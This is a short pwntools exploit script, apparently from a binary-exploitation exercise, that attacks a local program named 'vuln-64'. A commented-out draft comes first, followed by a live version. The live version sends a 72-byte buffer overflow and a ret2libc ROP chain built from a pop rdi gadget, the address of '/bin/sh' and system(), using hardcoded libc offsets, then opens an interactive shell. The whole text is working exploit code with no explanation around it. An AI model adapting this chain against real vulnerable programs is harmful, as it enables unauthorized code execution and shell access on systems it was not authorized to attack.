# from pwn import *

# elf = context.binary = ELF('./vuln-64')
# p = process()

# libc = elf.libc
# libc.address = 0x00007ffff7c00000

# system = libc.sym['system']
# binsh  = next(libc.search(b'/bin/sh'))

# POP_RDI = 0x00000000004011cb

# payload = b'x'*0x48 + p64(POP_RDI) + p64(binsh) + p64(system) + p64(0x0)

# p.clean()
# p.sendline(payload)
# p.interactive()

from pwn import *

p = process('./vuln-64')

libc_base = 0x00007ffff7c00000
system = libc_base + 0x000000000004f760
binsh = libc_base + 0x19fe34

POP_RDI = 0x4011cb

payload = b'A' * 72         # The padding
payload += p64(POP_RDI)     # gadget -> pop rdi; ret
payload += p64(binsh)       # pointer to command: /bin/sh
payload += p64(system)      # Location of system
payload += p64(0x0)         # return pointer - not important once we get the shell

p.clean()
p.sendline(payload)
p.interactive()
